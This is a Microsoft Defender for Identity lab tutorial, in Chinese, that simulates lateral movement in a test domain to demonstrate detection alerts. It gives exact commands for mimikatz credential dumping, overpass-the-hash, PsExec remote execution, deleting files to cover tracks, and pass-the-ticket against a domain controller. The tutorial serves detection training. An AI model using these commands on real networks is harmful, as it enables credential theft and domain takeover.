---
title: 適用於身分識別的 Microsoft Defender 安全性警示橫向移動劇本
description: 適用於身分識別的 Microsoft Defender 劇本描述如何模擬適用於身分識別的 Defender 所偵測到的橫向移動威脅。
author: shsagir
ms.author: shsagir
manager: shsagir
ms.date: 10/26/2020
ms.topic: tutorial
ms.collection: M365-security-compliance
ms.service: azure-advanced-threat-protection
ms.reviewer: itargoet
ms.suite: ems
ms.openlocfilehash: 8830feaf5d849d4ed38ea1bcc01002d04f6d2380
ms.sourcegitcommit: f434dbff577d9944df18ca7533d026acdab0bb42
ms.translationtype: HT
ms.contentlocale: zh-TW
ms.lasthandoff: 11/03/2020
ms.locfileid: "93274826"
---
# <a name="tutorial-lateral-movement-playbook"></a>教學課程：橫向移動劇本

[!INCLUDE [Rebranding notice](includes/rebranding.md)]

橫向移動劇本是[!INCLUDE [Product long](includes/product-long.md)] 安全性警示四部分教學課程系列中的第三部分。 [!INCLUDE [Product short](includes/product-short.md)] 安全性警示實驗室的目的是要說明 **[!INCLUDE [Product short](includes/product-short.md)]** 對網路可疑活動與潛在攻擊的識別及偵測功能。 此劇本會說明如何針對[!INCLUDE [Product short](includes/product-short.md)] 的一些「離散」偵測進行測試。 此劇本會著重在[!INCLUDE [Product short](includes/product-short.md)] 的「特徵」型功能，且不包括進階機器學習型、使用者型或實體型的行為偵測 (這些需要最多 30 天的真實網路流量學習期間)。 如需有關此系列每個教學課程的詳細資訊，請參閱[[!INCLUDE [Product short](includes/product-short.md)] 安全性警示實驗室概觀](playbook-lab-overview.md)。

此劇本會使用來自常見、真實世界、可公開取得的入侵及攻擊工具的模擬威脅，來示範[!INCLUDE [Product short](includes/product-short.md)] 的一些橫向移動路徑威脅偵測和安全性警示服務。

在本教學課程中，您將：

> [!div class="checklist"]
>
> - 收集 NTLM 雜湊，並模擬 Overpass-the-Hash 攻擊來取得 Kerberos 票證授權票證 (TGT)。
> - 偽裝為另一個使用者，在網路間橫向移動，並收集更多認證。
> - 模擬傳遞票證攻擊來取得網域控制站的存取權。
> - 在[!INCLUDE [Product short](includes/product-short.md)] 中檢閱來自橫向移動的安全性警示。

## <a name="prerequisites"></a>必要條件

1. [已完成的[!INCLUDE [Product short](includes/product-short.md)] 安全性警示實驗室](playbook-setup-lab.md)
    - 建議您儘可能完全依照實驗室設定指示進行操作。 您的實驗室與建議的實驗室設定越相似，就越容易依照[!INCLUDE [Product short](includes/product-short.md)] 測試程序進行操作。

2. [完成偵察劇本教學課程](playbook-reconnaissance.md)

## <a name="lateral-movement"></a>橫向移動

從我們在上一個教學課程，也就是偵察劇本中模擬的攻擊，我們獲得了廣泛的網路資訊。 透過使用該資訊，我們在實驗室的這個橫向移動階段目標是取得我們已經探索到的重大價值 IP 位址，並查看[!INCLUDE [Product short](includes/product-short.md)] 針對該移動的警示。 在先前的偵察實驗室模擬中，我們已將 10.0.24.6 識別為目標 IP，因為那就是 SamiraA 的電腦認證被公開的位置。 我們會模擬各種攻擊方法，以嘗試在網域間橫向移動。

## <a name="dump-credentials-in-memory-from-victimpc"></a>VictimPC 記憶體內的傾印認證

在我們的模擬偵察攻擊期間， **VictimPC** 不只公開 JeffL 的認證。 該電腦上也有探索到其他實用的帳戶。 若要使用 **VictimPC** 達到橫向移動，我們將在共用資源上嘗試列舉記憶體內的認證。 使用 **mimikatz** 傾印記憶體內的認證是一種使用常見工具的常用攻擊方法。

### <a name="mimikatz-sekurlsalogonpasswords"></a>Mimikatz sekurlsa::logonpasswords

1. 在 **VictimPC** 上開啟 **提高權限的命令提示字元** 。
1. 瀏覽至您儲存 Mimikatz 的 [工具] 資料夾，然後執行下列命令：

    ```dos
    mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" >> c:\temp\victimcpc.txt
    ```

1. 開啟 **c:\\temp\\victimpc.txt** 檢視透過找到並寫入 txt 檔案收集到的認證 Mimikatz。
    ![Mimikatz 輸出，包括 RonHD 的 NTLM 雜湊](media/playbook-lateral-sekurlsa-logonpasswords-output.png)

1. 我們已使用 mimikatz，成功從記憶體收集 RonHD 的 NTLM 雜湊。 我們很快就會需要 NTLM 雜湊。

    > [!Important]
    >
    > - 此範例中所顯示的雜湊與您在自己的實驗室環境中看到的雜湊應該不同，而且這是正常的。 本練習的目的是協助您了解如何取得雜湊、其值，並在下一個階段中使用它們。
    > - 電腦帳戶的認證也會在這次收集中公開。 雖然電腦帳戶的認證值在我們目前的實驗室中沒有用，但請記住，這是真實攻擊者使用的另一個途徑，可取得您環境中的橫向移動。

### <a name="gather-more-information-about-the-ronhd-account"></a>收集 RonHD 帳戶的詳細資訊

攻擊者可能不會一開始就知道誰是作為目標的 RonHD 或其值。 他們只知道如果這樣做有利，他們就會使用認證。 不過，如果我們充當攻擊者，可以使用 **net** 命令探索 RonHD 隸屬的群組。

從 **VictimPC** ，執行下列命令：

```dos
net user ronhd /domain
```

![對 RonHD 的帳戶進行偵察](media/playbook-lateral-sekurlsa-logonpasswords-ronhd_discovery.png)

從結果中，我們了解 RonHD 是 "Helpdesk" 安全性群組的成員。 我們知道 RonHD 會提供我們帳戶 *和具有 Helpdesk 安全性群組的* 隨附的權限。

### <a name="mimikatz-sekurlsapth"></a>Mimikatz sekurlsa::pth

使用稱為 **Overpass-the-Hash** 的常用技巧時，蒐集到的 NTLM 雜湊用來取得票證授權票證 (TGT)。 擁有使用者 TGT 的攻擊者可以偽裝成 RonHD 之類的遭入侵使用者。 偽裝成 RonHD 時，我們可以存取遭入侵使用者或其個別安全性群組可以存取的任何網域資源。

1. 從 **VictimPC** ，將目錄變更為包含 **Mimikatz.exe** 的資料夾。 檔案系統上的儲存體位置，然後執行下列命令：

    ```dos
    mimikatz.exe "privilege::debug" "sekurlsa::pth /user:ronhd /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:contoso.azure" "exit"
    ```

    > [!Note]
    > 如果您在上一個步驟中用於 RonHD 的雜湊不同，請將上述的 NTLM 雜湊取代為您從 *victimpc.txt* 收集的雜湊。

    ![透過 mimikatz 的 Overpass-the-hash](media/playbook-lateral-opth1.png)

1. 檢查新的命令提示字元是否開啟。 它將會以 RonHD 的身分執行，但不是看起來 *還不* 明顯。 請不要關閉新的命令提示字元，因為您接下來還會使用到。

[!INCLUDE [Product short](includes/product-short.md)] 無法偵測到在本機資源上傳遞的雜湊。 [!INCLUDE [Product short](includes/product-short.md)] 能偵測到 **某個資源使用雜湊來存取另一個** 資源或服務的情況。

### <a name="additional-lateral-move"></a>其他橫向移動

現在，使用 RonHD 的認證是否可以讓我們擁有我們先前使用 JeffL 的認證時沒有的存取權？
我們將使用 **PowerSploit** ```Get-NetLocalGroup``` 回答該問題。

1. 在因為我們先前的攻擊而開啟的命令主控台中，以 RonHD 身分執行下列項目：

    ```powershell
    Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
    Import-Module C:\tools\PowerSploit\PowerSploit.psm1 -Force
    Get-NetLocalGroup 10.0.24.6
    ```

    ![透過 PowerSploit 取得 10.0.24.6 的本機系統管理員](media/playbook-lateral-adminpcsamr.png)

    在幕後，這會使用遠端 SAM，針對我們稍早探索到，已向網域系統管理員帳戶公開的 IP，識別本機系統管理員。

    我們的輸出類似如下：

    ![PowerSploit Get-NetLocalGroup 的輸出](media/playbook-lateral-adminpcsamr_results.png)

    此電腦有兩個本機系統管理員，分別是內建的系統管理員 "ContosoAdmin" 和 "Helpdesk"。 我們知道 RonHD 是 "Helpdesk" 安全性群組的成員。 我們也已經知道電腦的名稱是 AdminPC。 我們擁有 RonHD 的認證，因此我們應該能夠使用該認證橫向移動到 AdminPC 並存取該電腦。

1. 如有需要，從 *在 RonHD 的內容中執行的相同命令提示字元* ，輸入 **exit** 離開 PowerShell。 然後，執行下列命令：

    ```dos
    dir \\adminpc\c$
    ```

1. 我們成功存取了 AdminPC。 我們來看看有哪些票證。 在相同的命令提示字元中，執行下列命令：

    ```dos
    klist
    ```

    ![使用 klist，向我們顯示目前 cmd.exe 處理程序中的 Kerberos 票證](media/playbook-lateral-klist.png)

您可以看到，對於這個特定的處理程序，我們在記憶體中有 RonHD 的 TGT。 我們已經在實驗室中順利執行 Overpass-the-Hash 攻擊。 我們轉換了之前遭到入侵的 NTLM 雜湊，並用來取得 Kerberos TGT。 之後該 Kerberos TGT 會用來存取其他網路資源，在此案例中為 AdminPC。

### <a name="overpass-the-hash-detected-in-product-short"></a>在[!INCLUDE [Product short](includes/product-short.md)] 中偵測到 Overpass-the-Hash

透過查看[!INCLUDE [Product short](includes/product-short.md)] 主控台，我們可以看到下列事項：

![[!INCLUDE [Product short](includes/product-short.md)] 偵測到 Overpass-the-Hash 攻擊](media/playbook-lateral-opthdetection.png)

[!INCLUDE [Product short](includes/product-short.md)] 偵測到 RonHD 的帳戶在 VictimPC 上遭到入侵，並接著用於成功取得 Kerberos TGT。 如果我們在警示中按一下 RonHD 的名稱，我們會前往 RonHD 的邏輯活動時間軸，我們可以在其中進行進一步調查。

![在邏輯活動時間軸中檢視偵測](media/playbook-lateral-opthlogicalactivity.png)

在安全性作業中心中，我們的安全性分析師會察覺認證遭到入侵，而且可以快速地調查所存取的資源。

## <a name="domain-escalation"></a>網域提升

從模擬的攻擊中，我們不但可以存取 AdminPC，我們還在 AdminPC 上驗證了系統管理員權限。 我們現在可以橫向移動至 AdminPC，並收集更多的認證。

在這裡，我們將：

- 在 AdminPC 上發動 Mimikatz
- 在 AdminPC 上收集票證
- 傳遞票證成為 SamiraA

### <a name="pass-the-ticket"></a>傳遞票證

從 **VictimPC** 上 *RonHD* 的內容中執行的命令提示字元，周遊至我們常見攻擊工具的所在位置。 然後，執行 *xcopy* 以將那些工具移至 AdminPC：

```dos
xcopy mimikatz.exe \\adminpc\c$\temp
```

出現提示時按下 `d`，指出 "temp" 資料夾是 AdminPC 上的目錄。

![將檔案複製到 AdminPC](media/playbook-escalation-xcopy1.png)

### <a name="mimikatz-sekurlsatickets"></a>Mimikatz sekurlsa::tickets

在 AdminPC 上發動 Mimikatz 時，我們將會使用 PsExec 從遠端執行它。

1. 周遊至 PsExec 所在的位置，並執行下列命令：

    ```dos
    PsExec.exe \\AdminPC -accepteula cmd /c (cd c:\temp ^& mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit")
    ```

    該命令將會執行，並匯出 LSASS.exe 處理程序中找到的票證，然後將其放在 AdminPC 上的目前目錄中。

1. 我們需要從 AdminPC，將票證複製回 VictimPC。 我們只對此範例中的 SamiraA 票證感興趣，因此請執行下列命令：

    ```dos
    xcopy \\adminpc\c$\temp\*SamiraA* c:\temp\adminpc_tickets
    ```

    ![將收集到的認證從 AdminPC 匯回到 VictimPC](media/playbook-escalation-export_tickets2.png)

1. 讓我們在 AdminPC 上刪除檔案以清除我們的追蹤。

    ```dos
    rmdir \\adminpc\c$\temp /s /q
    ```

    > [!Note]
    > 更複雜的攻擊者在電腦上取得系統管理權限之後執行任意程式碼時，不會觸及磁碟。

    在我們 **VictimPC** 上，我們已經在這些收集到的票證放在 **c:\temp\adminpc_tickets** 資料夾中：

    ![C:\temp\tickets 是我們從 AdminPC 匯出的 mimikatz 輸出](media/playbook-escalation-export_tickets4.png)

### <a name="mimikatz-kerberosptt"></a>Mimikatz Kerberos::ptt

當票證位於 VictimPC 本機上時，終於透過「傳遞票證」變成 SamiraA。

1. 從 **VictimPC** 檔案系統的 **Mimikatz** 位置，開啟新的 **提升權限的命令提示字元** ，然後執行下列命令：

    ```dos
    mimikatz.exe "privilege::debug" "kerberos::ptt c:\temp\adminpc_tickets" "exit"
    ```

    ![將遭竊的票證匯入到 cmd.exe 處理程序](media/playbook-escalation-ptt1.png)

1. 在相同提升權限的命令提示字元中，驗證正確的票證位於命令提示字元工作階段中。 執行下列命令：

    ```dos
    klist
    ```

    ![執行 klist 以查看在 CMD 處理程序中匯入的票證](media/playbook-escalation-ptt2.png)

1. 請注意，這些票證保持未使用。 作為攻擊者的我們已成功地「傳遞票證」。 我們從 AdminPC 收集到了 SamirA 的認證，然後將它傳遞至 VictimPC 上執行的另一個處理程序。

    > [!Note]
    > 與雜湊傳遞中相同，[!INCLUDE [Product short](includes/product-short.md)] 無法根據本機用戶端活動得知票證已傳遞。 不過，「該票證一旦使用之後」(也就是用來存取另一個資源/服務)，[!INCLUDE [Product short](includes/product-short.md)] 就會偵測到該活動。

1. 從 **VictimPC** 存取網域控制站，以完成您模擬的攻擊。 在現在使用記憶體中 SamirA 票證執行的命令提示字元中，執行：

    ```dos
    dir \\ContosoDC\c$
    ```

    ![使用 SamirA 的認證存取 ContosoDC 的 C 磁碟機](media/playbook-escalation-ptt3.png)

成功！ 透過我們的模擬攻擊，我們在網域控制站上取得了系統管理員存取權，並成功地入侵我們實驗室的 Active Directory 網域/樹系。

### <a name="pass-the-ticket-detection-in-product-short"></a>[!INCLUDE [Product short](includes/product-short.md)] 中的傳遞票證偵測

大部分的安全性工具沒辦法偵測到使用合法認證存取合法資源的時機。 相比之下，[!INCLUDE [Product short](includes/product-short.md)] 在這一連串事件中會偵測到什麼並發出警示？

- [!INCLUDE [Product short](includes/product-short.md)] 偵測到從 AdminPC 竊取 Samira 的票證並移動到 VictimPC。
- [!INCLUDE [Product short](includes/product-short.md)] 入口網站會顯示使用遭竊的票證實際上存取了哪些資源。
- 提供重要資訊和證據，以便確實識別從哪裡開始調查，以及哪些應採取哪些補救措施步驟。

[!INCLUDE [Product short](includes/product-short.md)] 偵測和警示資訊對於任何數位鑑識事件回應 (DFIR) 小組都具有重要價值。 您不只可以看到遭竊的認證，也會了解使用遭竊的票證存取及入侵了哪些資源。

![[!INCLUDE [Product short](includes/product-short.md)] 偵測到具有兩小時歸併的票證傳遞](media/playbook-escalation-pttdetection.png)

> [!NOTE]
> 此事件只會在 **2 小時** 後顯示在[!INCLUDE [Product short](includes/product-short.md)] 主控台上。 系統會故意隱藏此時間範圍內的此類型事件，以減少誤判。

## <a name="next-steps"></a>後續步驟

攻擊狙殺鏈中的下一個階段是網域支配。

> [!div class="nextstepaction"]
> [[!INCLUDE [Product short](includes/product-short.md)] 網域支配劇本](playbook-domain-dominance.md)

## <a name="join-the-community"></a>加入社群

是否有更多問題或想與其他人討論[!INCLUDE [Product short](includes/product-short.md)] 與相關的安全性？ 立即加入[[!INCLUDE [Product short](includes/product-short.md)] 社群](https://techcommunity.microsoft.com/t5/Azure-Advanced-Threat-Protection/bd-p/AzureAdvancedThreatProtection) \(英文\)！
